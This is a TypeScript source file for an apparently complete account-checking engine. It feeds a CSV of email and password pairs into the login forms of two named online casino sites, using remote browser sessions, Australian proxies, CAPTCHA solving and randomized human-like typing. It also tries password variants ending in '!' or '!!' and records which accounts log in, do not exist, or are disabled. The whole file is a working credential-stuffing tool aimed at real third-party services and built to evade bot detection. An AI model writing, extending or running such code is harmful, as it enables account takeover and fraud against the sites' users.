/**
 * AUTOMATION ENGINE
 * EventEmitter-based core that processes each CSV row through Browserbase.
 * Emits real-time events for the GUI server to relay over WebSocket.
 *
 * Login flow: smart response detection with multi-password retry sequences.
 * Response-based waits (networkidle + 500ms) instead of hardcoded timers.
 */

import { EventEmitter } from "events";
import Browserbase from "@browserbasehq/sdk";
import { chromium, type Browser, type Page } from "playwright-core";
import pLimit from "p-limit";
import * as fs from "fs";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface Credential {
  email: string;
  password: string;
  password2?: string;  // Column C — optional alternative password
  password3?: string;  // Column D — optional alternative password
}

export interface SiteConfig {
  name: string;
  url: string;
  selectors: {
    username: string;
    password: string;
    submit: string;
  };
}

export type Outcome =
  | "queued"
  | "testing"
  | "success"        // Login flow completed — no "incorrect" detected
  | "noaccount"      // All password attempts returned "incorrect"
  | "permdisabled"   // "been disabled" detected — permanent
  | "tempdisabled"   // "temporarily disabled" — 1hr cooldown
  | "N/A";           // Session/page crash

export interface SiteStatus {
  outcome: Outcome;
  attempts: number;
  error?: string;
}

export interface RowStatus {
  rowIndex: number;
  email: string;
  status: "queued" | "testing" | "done" | "skipped";
  sites: { [siteName: string]: SiteStatus };
  sessionId?: string;
  recordingUrl?: string;
  tempDisabledUntil?: string;  // ISO timestamp — skip until this time
}

export interface EngineConfig {
  apiKey: string;
  projectId: string;
  concurrency: number;
  maxRetries: number;
  targets: SiteConfig[];
}

// ─── Custom Errors ────────────────────────────────────────────────────────────

class PermDisabledError extends Error {
  constructor() {
    super("Account permanently disabled");
    this.name = "PermDisabledError";
  }
}

class TempDisabledError extends Error {
  constructor() {
    super("Account temporarily disabled — 1hr cooldown");
    this.name = "TempDisabledError";
  }
}

// ─── Response Types ───────────────────────────────────────────────────────────

type LoginResponse = "incorrect" | "disabled" | "tempdisabled" | "other" | "timeout";

// ─── Default Targets ──────────────────────────────────────────────────────────

export const DEFAULT_TARGETS: SiteConfig[] = [
  {
    name: "joe",
    url: "https://www.joefortunepokies.win/login",
    selectors: {
      username: "#username",
      password: "#password",
      submit: "#loginSubmit",
    },
  },
  {
    name: "ignition",
    url: "https://www.ignitioncasino.ooo/login",
    selectors: {
      username: "#email",
      password: "#login-password",
      submit: "#login-submit",
    },
  },
];

// Concurrency policy: default 3, absolute max 5 (× 2 sites = 10 max sessions)
const DEFAULT_CONCURRENCY = 3;
const MAX_CONCURRENT_CREDENTIALS = 5;

// ─── Engine ───────────────────────────────────────────────────────────────────

export class AutomationEngine extends EventEmitter {
  private running = false;
  private shouldStop = false;
  private rows: RowStatus[] = [];

  get isRunning(): boolean {
    return this.running;
  }

  get rowStatuses(): RowStatus[] {
    return this.rows;
  }

  /** Parse credentials.csv into credential objects (4-column format) */
  loadCredentials(csvPath: string): Credential[] {
    if (!fs.existsSync(csvPath)) return [];
    const content = fs.readFileSync(csvPath, "utf-8");
    const lines = content
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter((l) => l.length > 0);

    if (lines.length < 2) return [];

    const headers = lines[0].split(",").map((h) => h.trim().toLowerCase());
    const emailIdx = headers.indexOf("email");
    const passIdx = headers.indexOf("password");
    const pass2Idx = headers.indexOf("password2");
    const pass3Idx = headers.indexOf("password3");
    if (emailIdx < 0 || passIdx < 0) return [];

    return lines
      .slice(1)
      .map((line) => {
        const parts = line.split(",").map((p) => p.trim());
        return {
          email: parts[emailIdx] || "",
          password: parts[passIdx] || "",
          password2: pass2Idx >= 0 ? (parts[pass2Idx] || "") : "",
          password3: pass3Idx >= 0 ? (parts[pass3Idx] || "") : "",
        };
      })
      .filter((c) => c.email && c.password);
  }

  /** Start the automation loop over all credentials */
  async start(credentials: Credential[], config: EngineConfig): Promise<void> {
    if (this.running) {
      this.log("WARN", "Engine is already running");
      return;
    }

    this.running = true;
    this.shouldStop = false;
    const { targets } = config;

    // Initialise row statuses
    this.rows = credentials.map((c, i) => ({
      rowIndex: i,
      email: c.email,
      status: "queued" as const,
      sites: Object.fromEntries(
        targets.map((t) => [t.name, { outcome: "queued" as Outcome, attempts: 0 }])
      ),
    }));

    this.emit("started", {
      total: credentials.length,
      targets: targets.map((t) => t.name),
    });

    // Clamp concurrency: default 3, absolute max 5 — never exceeded
    const concurrency = Math.min(Math.max(config.concurrency || DEFAULT_CONCURRENCY, 1), MAX_CONCURRENT_CREDENTIALS);
    this.log("INFO", `Starting automation: ${credentials.length} credentials × ${targets.length} targets`);
    this.log("INFO", `Concurrency: ${concurrency} creds | Response-based waits`);

    const bb = new Browserbase({ apiKey: config.apiKey });
    const limit = pLimit(concurrency);
    let batchSlot = 0;

    // Kill any stale sessions from previous runs
    await this.cleanupStaleSessions(bb, config.projectId);

    const tasks = credentials.map((cred, idx) =>
      limit(async () => {
        if (this.shouldStop) {
          this.rows[idx].status = "skipped";
          for (const t of targets) this.rows[idx].sites[t.name].outcome = "N/A";
          this.emitRowUpdate(idx);
          return;
        }

        // Check tempdisabled cooldown
        if (this.rows[idx].tempDisabledUntil) {
          const until = new Date(this.rows[idx].tempDisabledUntil!).getTime();
          if (Date.now() < until) {
            this.rows[idx].status = "skipped";
            for (const t of targets) {
              this.rows[idx].sites[t.name].outcome = "tempdisabled";
            }
            this.log("WARN", `  Skipping ${cred.email} — tempdisabled until ${this.rows[idx].tempDisabledUntil}`);
            this.emitRowUpdate(idx);
            return;
          }
        }

        // Stagger session creation to avoid concurrent limit bursts
        const slot = batchSlot++;
        if (slot > 0) {
          const staggerMs = 2000 * (slot % concurrency);
          if (staggerMs > 0) {
            this.log("INFO", `  Stagger wait ${(staggerMs / 1000).toFixed(0)}s for slot ${slot}`);
            await this.sleep(staggerMs);
          }
        }

        // Mark row as testing
        this.rows[idx].status = "testing";
        this.emitRowUpdate(idx);
        this.log("INFO", `── Row ${idx + 1}/${credentials.length}: ${cred.email}`);

        let browser: Browser | null = null;
        let credentialDisabled = false;  // tracks cross-site disabled state

        try {
          // Create Browserbase session with retry
          let session: any = null;
          for (let attempt = 1; attempt <= 3; attempt++) {
            try {
              session = await bb.sessions.create({
                projectId: config.projectId,
                proxies: [
                  {
                    type: "browserbase",
                    geolocation: { country: "AU", city: "Melbourne" },
                  },
                ],
                browserSettings: {
                  recordSession: true,
                  logSession: true,
                  solveCaptchas: true,
                },
                keepAlive: false,
              });
              break;
            } catch (e: any) {
              const msg = e.message || String(e);
              if (attempt < 3 && (msg.includes("concurrent") || msg.includes("429") || msg.includes("limit"))) {
                const backoff = 5000 * attempt + Math.random() * 3000;
                this.log("WARN", `  Session create failed (attempt ${attempt}/3): ${msg.substring(0, 80)}`);
                this.log("INFO", `  Retrying in ${(backoff / 1000).toFixed(1)}s...`);
                await this.sleep(backoff);
              } else {
                throw e;
              }
            }
          }
          if (!session) throw new Error("Failed to create session after 3 attempts");

          this.rows[idx].sessionId = session.id;
          this.rows[idx].recordingUrl = `https://www.browserbase.com/sessions/${session.id}`;
          this.log("INFO", `  Session: ${session.id}`);

          browser = await chromium.connectOverCDP(session.connectUrl);
          const context = browser.contexts()[0];
          const page = context.pages()[0];
          page.setDefaultTimeout(30000);

          // Process each target site SEQUENTIALLY
          for (const target of targets) {
            if (this.shouldStop || credentialDisabled) break;

            this.rows[idx].sites[target.name].outcome = "testing";
            this.emitRowUpdate(idx);
            this.log("INFO", `  ${target.name}: starting login flow...`);

            try {
              const result = await this.executeLoginFlow(page, target, cred);
              this.rows[idx].sites[target.name].outcome = result;
              this.rows[idx].sites[target.name].attempts = 1; // will be updated inside executeLoginFlow
              this.log(
                result === "success" ? "OK" : "WARN",
                `  → ${target.name}: ${result}`
              );

              // Cross-site propagation: disabled/tempdisabled stops both sites
              if (result === "permdisabled") {
                credentialDisabled = true;
                for (const t of targets) {
                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                    this.rows[idx].sites[t.name].outcome = "permdisabled";
                  }
                }
                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
              } else if (result === "tempdisabled") {
                credentialDisabled = true;
                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
                for (const t of targets) {
                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
                  }
                }
                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown`);
              }
            } catch (e: any) {
              const errMsg = e.message || String(e);
              if (e instanceof PermDisabledError) {
                this.rows[idx].sites[target.name].outcome = "permdisabled";
                credentialDisabled = true;
                for (const t of targets) {
                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                    this.rows[idx].sites[t.name].outcome = "permdisabled";
                  }
                }
                this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED`);
              } else if (e instanceof TempDisabledError) {
                this.rows[idx].sites[target.name].outcome = "tempdisabled";
                credentialDisabled = true;
                this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
                for (const t of targets) {
                  if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
                    this.rows[idx].sites[t.name].outcome = "tempdisabled";
                  }
                }
                this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown`);
              } else {
                this.rows[idx].sites[target.name].outcome = "N/A";
                this.rows[idx].sites[target.name].error = errMsg;
                this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
              }
            }

            this.emitRowUpdate(idx);
          }

          await browser.close();
          browser = null;
          await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => {});
          this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
        } catch (e: any) {
          this.log("ERR", `  Session error: ${(e.message || String(e)).substring(0, 120)}`);
          for (const target of targets) {
            const s = this.rows[idx].sites[target.name];
            if (s.outcome === "queued" || s.outcome === "testing") {
              s.outcome = "N/A";
              s.error = e.message || String(e);
            }
          }
          if (browser) await browser.close().catch(() => {});
          if (this.rows[idx].sessionId) {
            await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => {});
          }
        }

        this.rows[idx].status = "done";
        this.emitRowUpdate(idx);
      })
    );

    await Promise.allSettled(tasks);

    // Write results CSV
    this.writeResultsCSV(targets);

    this.running = false;
    this.emit("complete", { rows: this.rows });
    this.log("INFO", "═══ Automation complete ═══");
  }

  /** Gracefully stop the engine after current tasks finish */
  stop(): void {
    if (!this.running) return;
    this.shouldStop = true;
    this.log("WARN", "Stop requested — finishing active sessions...");
    this.emit("stopping");
  }

  // ─── Private ──────────────────────────────────────────────────────────────

  /** Kill all running sessions from previous runs to free up concurrent slots */
  private async cleanupStaleSessions(bb: Browserbase, projectId: string): Promise<void> {
    try {
      this.log("INFO", "Cleaning up stale sessions...");
      const sessions = await bb.sessions.list({ status: "RUNNING" });
      const stale = [];
      for await (const session of sessions) {
        if (session.projectId === projectId) {
          stale.push(session.id);
        }
      }
      if (stale.length === 0) {
        this.log("INFO", "No stale sessions found");
        return;
      }
      this.log("WARN", `Found ${stale.length} stale session(s) — releasing...`);
      for (const id of stale) {
        await bb.sessions.update(id, { status: "REQUEST_RELEASE" }).catch(() => {});
      }
      await this.sleep(3000);
      this.log("INFO", `Cleaned up ${stale.length} stale session(s)`);
    } catch (e: any) {
      this.log("WARN", `Session cleanup failed: ${(e.message || String(e)).substring(0, 80)}`);
    }
  }

  /**
   * Build the password attempt sequence for a credential.
   * Path A (has alt passwords): [password, password2, password3, password3]
   * Path B (no alt passwords):  [password, password+"!", password+"!!", password+"!!"]
   */
  private buildPasswordSequence(cred: Credential): string[] {
    const hasAltPasswords = !!(cred.password2 && cred.password2.length > 0);

    if (hasAltPasswords) {
      // Path A: use CSV-provided alt passwords
      const pw2 = cred.password2!;
      const pw3 = (cred.password3 && cred.password3.length > 0) ? cred.password3 : pw2;
      return [cred.password, pw2, pw3, pw3]; // 4th attempt = retry pw3
    } else {
      // Path B: auto-generate fallback passwords
      return [
        cred.password,
        cred.password + "!",
        cred.password + "!!",
        cred.password + "!!", // 4th attempt = retry same
      ];
    }
  }

  /**
   * Wait for the site to respond after a login button press.
   * Watches for page content changes, waits for networkidle + 500ms.
   * Returns the detected response type.
   */
  private async waitForLoginResponse(page: Page, timeoutMs: number = 15000): Promise<LoginResponse> {
    try {
      // Wait for network to settle (page finished processing the login)
      await page.waitForLoadState("networkidle", { timeout: timeoutMs });
    } catch {
      // Timeout waiting for networkidle — treat as timeout
      return "timeout";
    }

    // Extra 500ms for late-loading DOM updates
    await this.sleep(500);

    // Read page content and check for known response phrases
    try {
      const content = (await page.content()).toLowerCase();

      // Check for permanent disable (highest priority)
      if (content.includes("been disabled")) {
        return "disabled"; // maps to permdisabled outcome
      }

      // Check for temporary disable
      if (content.includes("temporarily disabled")) {
        return "tempdisabled";
      }

      // Check for incorrect password
      if (content.includes("incorrect")) {
        return "incorrect";
      }

      // No known error phrase — could be a successful login
      return "other";
    } catch {
      return "timeout";
    }
  }

  /**
   * Execute the full login flow for a single site with smart password retry.
   * Returns the final outcome for this site.
   */
  private async executeLoginFlow(
    page: Page,
    site: SiteConfig,
    cred: Credential
  ): Promise<Outcome> {
    // ── Navigate to login page ──
    await page.goto(site.url, { waitUntil: "networkidle", timeout: 30000 });
    await this.sleep(1000);

    // ── Dismiss cookie notices ──
    await this.dismissCookieNotice(page);
    await this.captureScreenshot(page, `${site.name}:page-loaded`);

    // ── Fill email (human-like) ──
    await page.fill(site.selectors.username, "");
    await page.click(site.selectors.username);
    await this.sleep(200 + Math.random() * 300);
    for (const ch of cred.email) {
      await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
    }
    await this.sleep(500);
    await this.captureScreenshot(page, `${site.name}:email-filled`);

    // ── Build password sequence ──
    const passwords = this.buildPasswordSequence(cred);
    const hasAltPw = !!(cred.password2 && cred.password2.length > 0);
    this.log("INFO", `  ${site.name}: ${hasAltPw ? "Path A (alt passwords)" : "Path B (! fallbacks)"} — ${passwords.length} attempts`);

    // ── Password retry loop ──
    for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
      const pw = passwords[attemptIdx];
      const attemptNum = attemptIdx + 1;
      const isRetry = attemptIdx === 3; // 4th attempt is a re-press of same password

      if (!isRetry) {
        // Fill password field with new password
        await page.fill(site.selectors.password, "");
        await page.click(site.selectors.password);
        await this.sleep(200 + Math.random() * 300);
        for (const ch of pw) {
          await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
        }
        await this.sleep(500);
        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
      } else {
        this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: re-pressing login`);
      }

      // ── Press login button ──
      await page.click(site.selectors.submit);

      // ── Wait for response (5s timeout only on 3rd attempt) ──
      const timeout = attemptIdx === 2 ? 5000 : 15000;
      const response = await this.waitForLoginResponse(page, timeout);

      // ── Screenshot after response ──
      await this.captureScreenshot(page, `${site.name}:attempt-${attemptNum}-${response}`);

      // ── Handle response ──
      if (response === "disabled") {
        throw new PermDisabledError();
      }

      if (response === "tempdisabled") {
        throw new TempDisabledError();
      }

      if (response === "other") {
        // No "incorrect" detected — login flow completed
        this.log("OK", `  ${site.name}: no error detected after attempt ${attemptNum} — success`);
        return "success";
      }

      // response === "incorrect" or "timeout"
      if (attemptNum < 4) {
        this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} — trying next password`);
      } else {
        // 4th attempt still incorrect/timeout → no_account
        this.log("WARN", `  ${site.name}: ${response} on attempt 4 — confirmed no_account`);
        return "noaccount";
      }
    }

    // Should not reach here, but safety fallback
    return "noaccount";
  }

  /** Dismiss cookie consent banners by clicking accept/agree buttons */
  private async dismissCookieNotice(page: Page): Promise<void> {
    const selectors = [
      'button:has-text("Accept")',
      'button:has-text("Accept All")',
      'button:has-text("Accept all")',
      'button:has-text("Accept Cookies")',
      'button:has-text("Allow All")',
      'button:has-text("Allow all")',
      'button:has-text("Agree")',
      'button:has-text("I Agree")',
      'button:has-text("Got it")',
      'button:has-text("OK")',
      'a:has-text("Accept")',
      'a:has-text("Accept All")',
      '#onetrust-accept-btn-handler',
      '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
      '#cookie-accept',
      '#accept-cookies',
      '#acceptCookies',
      '#gdpr-accept',
      '.cookie-accept',
      '.accept-cookies',
      '[aria-label="Accept"]',
      '[aria-label="Accept All"]',
      '[aria-label="Accept cookies"]',
      '[data-action="accept"]',
      '[data-cookie-accept]',
      '[data-testid="cookie-accept"]',
    ];

    for (const selector of selectors) {
      try {
        const btn = page.locator(selector).first();
        if (await btn.isVisible({ timeout: 500 })) {
          await btn.click();
          this.log("INFO", `  🍪 Dismissed cookie notice via: ${selector}`);
          await this.sleep(500);
          return;
        }
      } catch {
        // Selector didn't match — try next
      }
    }
  }

  /** Capture a screenshot and emit it as a log event */
  private async captureScreenshot(page: Page, label: string): Promise<void> {
    try {
      const b64 = await page.screenshot({ type: "jpeg", quality: 50 }).then((buf) => buf.toString("base64"));
      this.emit("screenshot", { label, base64: b64, timestamp: new Date().toISOString() });
      this.log("SNAP", `📸 ${label}`);
    } catch {
      this.log("WARN", `Screenshot failed: ${label}`);
    }
  }

  private writeResultsCSV(targets: SiteConfig[]): void {
    const header = "email,site,outcome,attempts,sessionId,recordingUrl,error";
    const lines = [header];
    for (const row of this.rows) {
      for (const target of targets) {
        const s = row.sites[target.name];
        const err = (s.error || "").replace(/"/g, "'").substring(0, 200);
        lines.push(
          `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
        );
      }
    }
    fs.writeFileSync("results.csv", lines.join("\n"), "utf-8");
    this.log("INFO", `Results saved to results.csv`);
  }

  private emitRowUpdate(idx: number): void {
    this.emit("row-update", JSON.parse(JSON.stringify(this.rows[idx])));
  }

  private log(level: string, message: string): void {
    this.emit("log", {
      level,
      message,
      timestamp: new Date().toISOString(),
    });
  }

  private sleep(ms: number): Promise<void> {
    return new Promise((r) => setTimeout(r, ms));
  }
}
